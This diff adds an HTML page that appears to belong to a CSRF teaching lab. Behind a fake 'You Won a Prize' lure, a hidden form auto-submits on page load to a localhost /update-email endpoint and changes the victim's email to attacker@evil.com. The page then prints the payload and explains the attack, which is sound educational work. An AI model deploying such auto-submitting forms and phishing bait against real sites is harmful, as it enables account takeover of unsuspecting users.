@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎣 You Won a Prize!</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+      color: #e2e8f0;
+    }
+
+    /* Warning banner (for the student reading the code) */
+    .dev-banner {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: #dc2626;
+      color: #fff;
+      text-align: center;
+      padding: .6rem;
+      font-size: .85rem;
+      font-weight: 600;
+      z-index: 100;
+    }
+
+    .container {
+      max-width: 640px;
+      width: 100%;
+      text-align: center;
+    }
+
+    /* Fake prize page (what the victim sees) */
+    .bait {
+      background: #1e293b;
+      border: 2px solid #fbbf24;
+      border-radius: 1rem;
+      padding: 2.5rem;
+      margin-bottom: 2rem;
+      animation: glow 2s ease-in-out infinite alternate;
+    }
+    @keyframes glow {
+      from { box-shadow: 0 0 20px rgba(251,191,36,.1); }
+      to   { box-shadow: 0 0 40px rgba(251,191,36,.25); }
+    }
+    .bait .emoji { font-size: 4rem; margin-bottom: 1rem; }
+    .bait h1 { font-size: 1.8rem; color: #fbbf24; margin-bottom: .5rem; }
+    .bait p { color: #94a3b8; font-size: 1rem; line-height: 1.6; }
+
+    .spinner {
+      display: inline-block;
+      width: 20px; height: 20px;
+      border: 3px solid #475569;
+      border-top: 3px solid #fbbf24;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+      margin-right: .5rem;
+      vertical-align: middle;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .status {
+      margin-top: 1rem;
+      font-size: .9rem;
+      color: #64748b;
+    }
+
+    /* Technical breakdown */
+    .breakdown {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 1rem;
+      padding: 2rem;
+      text-align: left;
+    }
+    .breakdown h2 {
+      color: #ef4444;
+      font-size: 1.2rem;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+    .breakdown h3 {
+      color: #fbbf24;
+      font-size: 1rem;
+      margin: 1rem 0 .5rem;
+    }
+    .breakdown p, .breakdown li {
+      color: #94a3b8;
+      font-size: .9rem;
+      line-height: 1.7;
+    }
+    .breakdown ol { padding-left: 1.25rem; }
+    .breakdown code {
+      background: #334155;
+      padding: .1rem .4rem;
+      border-radius: .25rem;
+      color: #f87171;
+      font-size: .85rem;
+    }
+    .breakdown pre {
+      background: #0f172a;
+      padding: 1rem;
+      border-radius: .5rem;
+      overflow-x: auto;
+      margin: .75rem 0;
+      border: 1px solid #334155;
+    }
+    .breakdown pre code {
+      background: none;
+      color: #e2e8f0;
+      font-size: .85rem;
+    }
+
+    .tag {
+      display: inline-block;
+      padding: .2rem .6rem;
+      border-radius: 9999px;
+      font-size: .75rem;
+      font-weight: 600;
+    }
+    .tag-danger { background: #7f1d1d; color: #fca5a5; }
+    .tag-info   { background: #1e3a5f; color: #7dd3fc; }
+
+    .back-link {
+      display: inline-block;
+      margin-top: 1.5rem;
+      color: #38bdf8;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .back-link:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+  <div class="dev-banner">
+    ⚠️ ATTACKER SIMULATION — This page demonstrates a CSRF attack against the VULNERABLE /update-email endpoint
+  </div>
+
+  <div class="container">
+    <!-- Bait Content -->
+    <div class="bait">
+      <div class="emoji">🎉</div>
+      <h1>Congratulations!</h1>
+      <p>You've been selected for an exclusive reward! Please wait while we verify your eligibility...</p>
+      <div class="status">
+        <span class="spinner"></span>
+        <span id="status-text">Verifying your account...</span>
+      </div>
+    </div>
+
+    <!-- Hidden iframe to silently receive the form response -->
+    <iframe name="csrf-target" style="display:none;"></iframe>
+
+    <!-- Hidden CSRF Form — auto-submits into the iframe on page load -->
+    <form id="csrf-form" action="http://localhost:3000/update-email" method="POST" target="csrf-target" style="display:none;">
+      <input type="hidden" name="email" value="attacker@evil.com">
+    </form>
+
+    <!-- Technical Breakdown -->
+    <div class="breakdown">
+      <h2>🔍 What Just Happened? (Technical Breakdown)</h2>
+
+      <p>When you loaded this page, a <span class="tag tag-danger">hidden form</span> was automatically submitted to <code>http://localhost:3000/update-email</code> — changing your email to <code>attacker@evil.com</code>.</p>
+
+      <h3>🧬 The Malicious Payload</h3>
+      <pre><code>&lt;form id="csrf-form"
+      action="http://localhost:3000/update-email"
+      method="POST"
+      style="display:none;"&gt;
+  &lt;input type="hidden"
+         name="email"
+         value="attacker@evil.com"&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+  document.getElementById('csrf-form').submit();
+&lt;/script&gt;</code></pre>
+
+      <h3>📋 Attack Flow</h3>
+      <ol>
+        <li>Victim is <strong>logged in</strong> to the app (has a valid <code>connect.sid</code> session cookie).</li>
+        <li>Victim visits this "attacker" page (e.g., via a phishing link).</li>
+        <li>The hidden form auto-submits a POST to <code>/update-email</code>.</li>
+        <li>The browser <strong>automatically attaches</strong> the victim's session cookie.</li>
+        <li>Server sees a valid session → updates the email to <code>attacker@evil.com</code>. <span class="tag tag-danger">PWNED</span></li>
+      </ol>
+
+      <h3>❓ Why It Works</h3>
+      <p>The <code>/update-email</code> route checks <strong>only</strong> the session cookie. It has <strong>no CSRF token</strong> verification. Since the browser sends cookies with any request to the origin — even from a different site — the server cannot distinguish a legitimate request from a forged one.</p>
+
+      <br>
+      <p style="text-align:center;">
+        <a href="/profile" class="back-link">← Check Your Profile (email was changed!)</a>
+        <br><br>
+        <a href="/attacker-page-secure" class="back-link" style="color:#10b981;">🛡️ Try This Attack Against the Secure Route →</a>
+      </p>
+    </div>
+  </div>
+
+  <script>
+    // Auto-submit the CSRF form into the hidden iframe after a short delay
+    setTimeout(() => {
+      document.getElementById('csrf-form').submit();
+    }, 1500);
+
+    // Update status text
+    setTimeout(() => {
+      document.getElementById('status-text').textContent = 'Redirecting to your reward...';
+    }, 800);
+
+    // Show confirmation that the attack succeeded
+    setTimeout(() => {
+      document.getElementById('status-text').innerHTML = '✅ Done! <a href="/profile" style="color:#fbbf24;text-decoration:underline;">Check your profile</a> — your email has been changed!';
+    }, 2500);
+  </script>
+</body>
+</html>
+
